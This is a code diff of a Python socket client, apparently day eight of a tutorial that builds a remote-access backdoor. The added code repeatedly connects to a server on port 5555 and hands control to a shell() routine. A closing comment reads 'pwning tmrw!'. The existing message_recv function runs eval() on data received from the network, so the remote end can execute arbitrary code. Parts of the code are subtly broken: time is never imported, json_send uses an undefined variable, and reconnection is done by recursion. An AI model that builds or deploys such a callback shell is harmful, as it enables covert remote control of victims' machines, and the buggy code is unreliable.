@@ -1,6 +1,7 @@
-# Day 7 - Making the message adaptable to any type.
+# Day 8 - The Json Module
 
 import socket
+import json
 
 def ip_address():
     global server_ip
@@ -17,6 +18,30 @@ server_port = 5555
 
 ########################
 
+def connection():
+    while True:
+        time.sleep(0)
+        try:
+            client.connect((server_ip, server_port))
+            shell()
+            client.close()
+            break
+        except:
+            connection()
+
+
+def json_send():
+    jsondata = json.dumps(data)
+    client.send(jsondata.encode())
+
+def json_recv(size=1024):
+    data = ''
+    while True:
+        try:
+            data += client.recv(size).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
 
 def message_send(string, size=8):
     no_str = False
@@ -46,7 +71,6 @@ def message_recv(size=8):
         body = eval(body)
     return body
 
-
 def client_conn():
     global client
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -56,9 +80,7 @@ def client_conn():
 client_conn()
 
 # testing
-message_send(123)
-message_send('123')
-message_send([123])
+
 
 
 # pwning tmrw!
